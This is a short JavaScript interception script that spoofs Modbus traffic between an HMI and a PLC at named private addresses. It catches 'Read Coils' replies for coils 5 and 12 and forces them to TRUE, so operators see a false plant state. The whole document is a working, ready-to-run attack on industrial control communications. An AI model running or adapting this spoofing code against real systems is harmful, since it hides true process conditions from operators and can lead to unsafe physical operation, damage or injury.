
var transactionForCoil5 = -1;
var transactionForCoil12 = -1;

function onData(from, to, data) {
  if (data.length >= 10) {
    var functionCode = data[7];
    var time = new Date().toTimeString().split(' ')[0];
    var isFromHMI = from.indexOf(".11") !== -1;

    if (functionCode == 1) {
      
      if (isFromHMI) {
        var startAddr = (data[8] << 8) | data[9];
        
        if (startAddr === 5) {
          transactionForCoil5 = (data[0] << 8) | data[1]; // Store the Transaction ID for coil 5
          log("[" + time + "] Intercepted HMI read for coil 5. Marking TX ID " + transactionForCoil5 + " for spoofing.");
        } else if (startAddr === 12) {
          transactionForCoil12 = (data[0] << 8) | data[1]; // Store the Transaction ID for coil 12
          log("[" + time + "] Intercepted HMI read for coil 12. Marking TX ID " + transactionForCoil12 + " for spoofing.");
        }
      }
      
      else { 
        var responseId = (data[0] << 8) | data[1];
        var targetFound = false;
        var targetCoil = -1;

        // Check if the response ID matches either of the transactions we're watching
        if (responseId === transactionForCoil5 && transactionForCoil5 !== -1) {
            targetFound = true;
            targetCoil = 5;
            transactionForCoil5 = -1; // Reset state immediately
        } else if (responseId === transactionForCoil12 && transactionForCoil12 !== -1) {
            targetFound = true;
            targetCoil = 12;
            transactionForCoil12 = -1; // Reset state immediately
        }

        if (targetFound) {
          log("╔═══[" + time + "]═══[COIL READ RESPONSE FALSIFIED]═══╗");
          log("║ Intercepted PLC response for coil " + targetCoil + ".");
          log("╠══════════════════════════════════════════════════════╣");
          log("║ [+] ACTION: Forcing coil value to TRUE for the HMI.    ║");
          log("╚══════════════════════════════════════════════════════╝");
          
          // Modify the response payload. The first data byte is at index 9.
          // The first bit of this byte corresponds to the first requested coil.
          // We use a bitwise OR with 1 (binary 00000001) to force the first bit
          // to 1 (TRUE) without changing the other 7 bits in the byte.
          data[9] = data[9] | 0x01;
          
          return data; // Send the modified packet to the HMI
        }
      }
    }
  }

  // Allow all other traffic (including writes, other reads, etc.) to pass through unchanged.
  return data;
}

// Startup banner
log("");
log("╔══════════════════════════════════════════════════════╗");
log("║         FALSIFY COIL READS SCRIPT ACTIVE             ║");
log("╠══════════════════════════════════════════════════════╣");
log("║ Configuration:                                       ║");
log("║ • Intercepting Modbus 'Read Coils' requests (FC1).   ║");
log("║ • IF HMI reads coil 5 -> Falsify response to TRUE.   ║");
log("║ • IF HMI reads coil 12 -> Falsify response to TRUE.  ║");
log("║ • All other traffic is ALLOWED to pass.              ║");
log("╠══════════════════════════════════════════════════════╣");
log("║ Target: 192.168.1.120 (PLC)                          ║");
log("║ Source: 192.168.1.11 (HMI)                           ║");
log("╚══════════════════════════════════════════════════════╝");
log("");
log("Monitoring Modbus traffic...");